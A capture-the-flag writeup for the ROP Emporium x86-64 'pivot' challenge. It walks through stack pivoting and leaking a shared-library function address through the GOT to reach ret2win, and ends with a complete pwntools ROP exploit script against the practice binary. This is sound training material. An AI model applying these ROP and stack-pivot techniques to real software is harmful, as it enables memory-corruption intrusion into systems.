---
title: "ROP Emporium x86-64 Challenge 7: pivot"
date: "2025-12-28"
description: "Writeup for the pivot challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 7: pivot

#### December 28, 2025

In this challenge, we'll learn a new binary exploitation technique.

In some binaries, we might not have enough space in the stack to build a complete ROP chain. However, we might be able to work around that on some occasions by **pivoting the stack**. This involves writing a chain somewhere else in memory and then *pivoting* the stack to that address, which essentially means moving your stack to that position.

We'll learn to do just that in this challenge. It is a bit tricky, though, and we'll have to use different methodologies for it.

Let's start by running the binary:

```
$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7efecc008f10
Send a ROP chain now and it will land there
> AAAAAAAA
Thank you!

Now please send your stack smash
> BBBBBBBBBB
Thank you!

Exiting
```

For this challenge, we are told that we need to call `ret2win` to win. This function seems to be in `libpivot`. We'll see what that means later.

Other than that, we're also given an address in which seemingly we can pivot into. Executing the binary multiple times we'll make you realize that this address changes per execution. We'll see how we deal with that.

The catch is that we're given two inputs now, which essentially means that we'll need to build two payloads. The first one will contain the ROP chain that will be placed in the pivot address, and the second one will be the regular buffer input we're accustomed to by now.

Let's take a look at the functions:

```
pwndbg> info functions
0x00000000004006a0  _init
0x00000000004006d0  free@plt
0x00000000004006e0  puts@plt
0x00000000004006f0  printf@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  foothold_function@plt
0x0000000000400730  malloc@plt
0x0000000000400740  setvbuf@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x00000000004008f1  pwnme
0x00000000004009a8  uselessFunction
0x00000000004009bb  usefulGadgets
0x00000000004009d0  __libc_csu_init
0x0000000000400a40  __libc_csu_fini
0x0000000000400a44  _fini
```

Just like in the other challenges, we have our regular functions like `pwnme` and `usefulGadgets`. We also have a so-called `uselessFunction` (somehow I doubt that), but... Where's `ret2win`? We are told that's our target function, but it's nowhere to be see in `info functions`. Well, there's another catch in this challenge.

## Shared libraries

As we saw before, `ret2win` seems to be in a library called `libpivot`. If we read the challenge description, it says that this challenge imports one function from that library: `foothold_function`, but that `ret2win` isn't imported. Then how can we call a function that isn't even in the code?

Libraries are just a set of already defined functions and variables that we can load into our code to use them along with the functions we've created. Let's quickly `ls` the challenge directory:

```
$ ls
flag.txt  libpivot.so  pivot
```

Other than the binary and the flag, there's a `.so` file, our `libpivot`. This is a **shared library**. A shared library is a regular library, with code in it of course, that is mapped into memory so multiple programs (or other libraries) can use those functions in their own code.

Getting right into the point, **the whole library is loaded into memory**. In our binary, only `foothold_function` is actually called from `libpivot`. However, somewhere else in memory, `ret2win`, and whatever other functions exist in `libpivot` can be found.

Another handful piece of knowledge is that the functions of shared libraries are loaded into memory contiguously, one after another. Thus, we might be able to access `ret2win` just by adding an offset to the function address of `foothold_function`, which we know from `info functions`.

Great! Know we know about stack pivoting and the use of shared libraries. Let's hunt for gadgets and other useful resources we might use in the binary:

```
pwndbg> disas usefulGadgets
   0x00000000004009bb <+0>:	    pop    rax
   0x00000000004009bc <+1>:	    ret
   0x00000000004009bd <+2>:	    xchg   rsp,rax
   0x00000000004009bf <+4>:	    ret
   0x00000000004009c0 <+5>:	    mov    rax,QWORD PTR [rax]
   0x00000000004009c3 <+8>:	    ret
   0x00000000004009c4 <+9>:	    add    rax,rbp
   0x00000000004009c7 <+12>:	ret
   0x00000000004009c8 <+13>:	nop    DWORD PTR [rax+rax*1+0x0]
```

We've got some useful stuff in here. First, a simple `pop rax; ret` gadget we can use to store arbitrary values into `rax`.  

Then we have a `xchg rsp, rax; ret` gadget. This one is very useful for stack pivoting, because it swaps the values between `rax` and `rsp`. `rsp` is the **Stack Pointer**, if we have control over it, we can easily change the address of the stack, essentially pivoting it.

With the `mov rax, [rax]` we can move into the register `rax` whatever value in memory is in the address of `rax`. And then, we have a `add rax, rbp; ret` gadget, which should be self-explanatory. However, since this gadget requires control to `rbp`, let's see if we can find another gadget to pop a value into `rbp`:

```
pwndbg> rop
...
0x004007c8 : pop rbp ; ret
...
```

Sure enough, we do. Let's note its address down.

## Pivoting the stack
We should probably start thinking about the stack pivoting first. We'll have to write a ROP chain (preferably small, because we're told we don't have much space in the buffer) to change the stack position elsewhere: the address we're given when we run the binary. This is a good moment to start talking about the way we will perform the exploit this time.

Up until now, in my writeups, I've used a python script to create a file containing the payload, to then use as input for the binary, separately. In this case, because we need to "extract" the address we're given in the output of the binary, and because we require two payloads, not one, it's going to be more comfortable to interact with the binary directly in the Python script, with pwntools. Let's start with it!

```
from pwn import *

elf = context.binary = ELF("./pivot", checksec=False)
p = gdb.debug(elf.path, gdbscript="")
```

With this code, we're basically creating a variable that will link a process that will run pwndbg with the binary on it, in case we need to look up information with pwndbg mid-runtime. With this, we'll be able to provide input to it and read its output more comfortably. First, let's store in a variable the address that the binary gives us to pivot to:

```
p.recvuntil(b"pivot: ")
PIVOT_STACK_ADDRESS = int(p.recvline(), 16)
```

With this snippet, we read the output until `pivot: `. After that string, in the same line, we can find the pivot stack address is. So, we read what's left of that line and we store it in `PIVOT_STACK_ADDRESS`, cast into an integer.

Now let's do the regular drill, let's store into variables the useful gadgets:

```
POP_RAX_GADGET_ADDRESS = 0x004009bb
XCHG_RSP_RAX_GADGET_ADDRESS = 0x004009bd
MOV_RAX_RAX_GADGET_ADDRESS = 0x004009c0
ADD_RAX_RBP_GADGET_ADDRESS = 0x004009c4
POP_RBP_GADGET_ADDRESS = 0x004007c8
```

These gadgets are more than enough to perform the stack pivoting. Our idea is to load the pivot stack address into `rsp`, essentially changing the address of the stack to `PIVOT_STACK_ADDRESS`. This can be done fairly easiliy.

After finding out that the return address offset is once again 40, we can write the first payload:

```
OFFSET = 40

first_payload = b"A" * OFFSET
first_payload += p64(POP_RAX_GADGET_ADDRESS)
first_payload += p64(PIVOT_STACK_ADDRESS)
first_payload += p64(XCHG_RSP_RAX_GADGET_ADDRESS)
```

That'll do. Since we have full control of `rax`, first we pop the pivot stack address into it, and then we exchange the value of `rsp` with `rax`. Now `rsp` holds `PIVOT_STACK_ADDRESS`.

After this payload, we'll have a bigger stack to work on. Here's where the actual exploit will happen, where we'll somehow call `ret2win`. Let's see how we can do this.

## Diving into the library

Before we continue with the exploit script, we should take a proper dive into what's actually inside `libpivot`. This can actually be done with pwndbg as well:

```
$ pwndbg libpivot.so
pwndbg> info functions
0x0000000000000808  _init
0x0000000000000830  puts@plt
0x0000000000000840  fclose@plt
0x0000000000000850  fgets@plt
0x0000000000000860  fopen@plt
0x0000000000000870  exit@plt
0x0000000000000880  __cxa_finalize@plt
0x0000000000000890  deregister_tm_clones
0x00000000000008d0  register_tm_clones
0x0000000000000920  __do_global_dtors_aux
0x0000000000000960  frame_dummy
0x000000000000096a  foothold_function
0x000000000000097d  void_function_01
0x0000000000000997  void_function_02
0x00000000000009b1  void_function_03
0x00000000000009cb  void_function_04
0x00000000000009e5  void_function_05
0x00000000000009ff  void_function_06
0x0000000000000a19  void_function_07
0x0000000000000a33  void_function_08
0x0000000000000a4d  void_function_09
0x0000000000000a67  void_function_10
0x0000000000000a81  ret2win
0x0000000000000b14  _fini
```

These are the functions inside `libpivot`. *Now* we can see `ret2win`.

Notice how there are a few `void_function`s between `ret2win` and `foothold_function`, the function that actually can be called inside our binary. No matter, as I've mentioned before, shared libraries are stored in memory contiguously. All we need is take the addresses of `foothold_function` and `ret2win` and subtract them. This way, we'll obtain the offset between the two functions. Let's go back to our script:

```
LIBPIVOT_RET2WIN_FUNCTION_ADDRESS = 0x0000000000000a81
LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS = 0x000000000000096a

RET2WIN_OFFSET = LIBPIVOT_RET2WIN_FUNCTION_ADDRESS - LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS
```

With this, we can start writing the second payload, the one in the pivot address. Let's start by calling `foothold_function`. Before that, however, let's remember that the address in `LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS` won't work for this, because it's the address of the function *inside* the library itself. We need to take the address from `info functions` in the `pivot` binary:

```
FOOTHOLD_FUNCTION_ADDRESS = 0x0000000000400720

pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS)
```

Notice how we don't need an offset for this payload. This makes sense, because even if we've pivoted, we're still in the same ROP chain, so we can keep returning to other gadgets without an offset.

Let's see what happens if we call this function. Since we'll be using this very script to provide input for the binary, let's add the code for that:

```
p.sendlineafter(b">", pivot_payload)
p.sendlineafter(b">", first_payload)
p.interactive()
```

In this case,  we send input to the binary when the character `>` shows in the output. We send the pivot payload first because the the binary says so, and then the buffer overflow payload. `p.interactive()` is used to allow us to interact with the binary ourselves after introducing the inputs. This will allow us to see what happens after. Let's see what happens when we run the script:

```
$ python3 exploit.py
[*] Switching to interactive mode
 Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
[*] Got EOF while reading in interactive
```

Interesting. `foothold_function` printed out that we need to check the `.got.plt` entry to gain a foothold into `libpivot`. That's exactly what we need. But what's `.got.plt`? Well, it all comes down to the way library functions are linked into binaries.

## Linking functions from libraries

When we use a shared library in a program, the functions from the library don't get copied into the binary just like that. ELF binaries use a process called **Lazy Linking** to only create pointers to library functions when they're needed. The **GOT** is used for that. The GOT (Global Offset Table) will end up containing the pointers to the external functions that are called in the binary.

When we call an external function, we don't call its pointer directly, we ask the **PLT** (Procedure Linkage Table), which manages the references for us and performs the lazy linking.

Admittedly, this is a bit dense to explain in a writeup. If you want to learn more, I suggest [this wonderful article](https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a) that goes around everything you need to know. But as a TL;DR, in order to use the offset to jump into `ret2win`, first we need to know the *actual* address of `foothold_function`. This function is "unlocked" the first time we call it, when the lazy linking is performed.

What we need to do is to store in what address will the real pointer to `foothold_function` be. We can check it running the program and executing the `got` command:

```
$ python3 exploit.py
pwndbg> got
...
[0x601040] foothold_function -> 0x400726 (foothold_function@plt+6) <- push rbg
...
```

That's the address! Let's add it to a variable:

```
FOOTHOLD_FUNCTION_GOT_ADDRESS = 0x601040
```

When we call `foothold_function` for the first time, its real pointer will be stored in this address. Let's use the gadgets we have to store in `rax` that "real" address.

```
pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS) # we call it once to "unlock" the real address
pivot_payload += p64(POP_RAX_GADGET_ADDRESS)
pivot_payload += p64(FOOTHOLD_FUNCTION_GOT_ADDRESS)
pivot_payload += p64(MOV_RAX_RAX_GADGET_ADDRESS)
```

First, we pop into `rax` the GOT entry for `foothold_function`. Since we've called `foothold_function` once already, the real address will be there by now. So with the `mov rax, [rax]; ret` gadget, we store it in `rax`. 


Supposedly, the address to `ret2win` should be in the address of `foothold_function` + `RET2WIN_OFFSET` . We need to perform that addition in our code. Luckily, we have a gadget just for that: `add rax, rbp; ret`. We just need to populate the register with both operands:

```
pivot_payload += p64(POP_RBP_GADGET_ADDRESS)
pivot_payload += p64(RET2WIN_OFFSET)
```

Now, we have the `foothold_function` real address in `rax` and the `ret2win` offset in `rbp`. We just need to call the `add` gadget:

```
pivot_payload += p64(_ADD_RAX_RBP_GADGET_ADDRESS)
```

Awesome! Now we have the address of `ret2win` in `rax`. Now we just need to call it. Luckily for us, by using `rop`, we can find a `call rax; ret`  gadget. This gadget will just call the function in the address located in `rax`. It's perfect:

```
CALL_RAX_GADGET_ADDRESS = 0x4006b0

...

pivot_payload += p64(CALL_RAX_GADGET_ADDRESS)
```

That should do! Here's the full code:

```
from pwn import *

elf = context.binary = ELF("./pivot", checksec=False)
p = process(elf.path)

p.recvuntil(b"pivot: ")
PIVOT_STACK_ADDRESS = int(p.recvline(), 16)

OFFSET = 40

POP_RAX_GADGET_ADDRESS = 0x004009bb
XCHG_RSP_RAX_GADGET_ADDRESS = 0x004009bd
MOV_RAX_RAX_GADGET_ADDRESS = 0x004009c0
ADD_RAX_RBP_GADGET_ADDRESS = 0x004009c4
POP_RBP_GADGET_ADDRESS = 0x004007c8
CALL_RAX_GADGET_ADDRESS = 0x4006b0

LIBPIVOT_RET2WIN_FUNCTION_ADDRESS = 0x0000000000000a81
LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS = 0x000000000000096a
FOOTHOLD_FUNCTION_ADDRESS = 0x0000000000400720
FOOTHOLD_FUNCTION_GOT_ADDRESS = 0x601040

RET2WIN_OFFSET = LIBPIVOT_RET2WIN_FUNCTION_ADDRESS - LIBPIVOT_FOOTHOLD_FUNCTION_ADDRESS

first_payload = b"A" * OFFSET
first_payload += p64(POP_RAX_GADGET_ADDRESS)
first_payload += p64(PIVOT_STACK_ADDRESS)
first_payload += p64(XCHG_RSP_RAX_GADGET_ADDRESS)

pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS)

pivot_payload = p64(FOOTHOLD_FUNCTION_ADDRESS) # we call it once to "unlock" the real address
pivot_payload += p64(POP_RAX_GADGET_ADDRESS)
pivot_payload += p64(FOOTHOLD_FUNCTION_GOT_ADDRESS)
pivot_payload += p64(MOV_RAX_RAX_GADGET_ADDRESS)
pivot_payload += p64(POP_RBP_GADGET_ADDRESS)
pivot_payload += p64(RET2WIN_OFFSET)
pivot_payload += p64(ADD_RAX_RBP_GADGET_ADDRESS)
pivot_payload += p64(CALL_RAX_GADGET_ADDRESS)

p.sendlineafter(b">", pivot_payload)
p.sendlineafter(b">", first_payload)
p.interactive()
```

Since we don't need pwndbg anymore, I changed the process to execute the raw binary, without GDB. Let's run the script:

```
$ python3 exploit.py
Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
